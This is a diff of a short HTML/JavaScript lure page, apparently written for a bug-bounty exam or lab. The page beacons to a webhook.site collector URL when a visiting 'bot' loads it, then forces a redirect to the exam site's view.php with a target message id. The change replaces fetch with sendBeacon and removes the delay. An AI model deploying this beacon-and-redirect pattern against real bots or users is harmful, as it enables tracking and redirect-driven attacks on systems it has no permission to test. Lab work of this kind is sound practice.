@@ -1,20 +1,17 @@
 <!DOCTYPE html>
 <html>
 <body>
-    <h1>Processing...</h1>
     <script>
-        // FIXED DOMAIN: webhook.site
-        const id = "69e2a884bee6d6b7c662a00f"; 
-        const webhook = "https://webhook.site/25f05aa1-8e17-4fef-a97f-3bb992e8bc01";
+        // 1. USE YOUR NEW WEBHOOK ID HERE
+        const webhookUrl = "https://webhook.site/25f05aa1-8e17-4fef-a97f-3bb992e8bc01";
+        // 2. USE YOUR LATEST MESSAGE ID HERE
+        const targetId = "69e2a884bee6d6b7c662a00f"; 
 
-        // Step 1: Tell Webhook the bot is here
-        // Added .catch to ensure script continues even if fetch fails
-        fetch(webhook + "/?step=1_bot_landed_on_github").catch(() => {});
+        // Send a signal so we know the bot at least reached GitHub
+        navigator.sendBeacon(webhookUrl + "/?status=bot_on_github");
 
-        // Step 2: Redirect to the exam site
-        setTimeout(() => {
-            window.location.replace("https://bugbounty-exam.hashacademy.co/view.php?id=" + id);
-        }, 500);
+        // Force the redirect
+        window.location.href = "https://bugbounty-exam.hashacademy.co/view.php?id=" + targetId;
     </script>
 </body>
 </html>
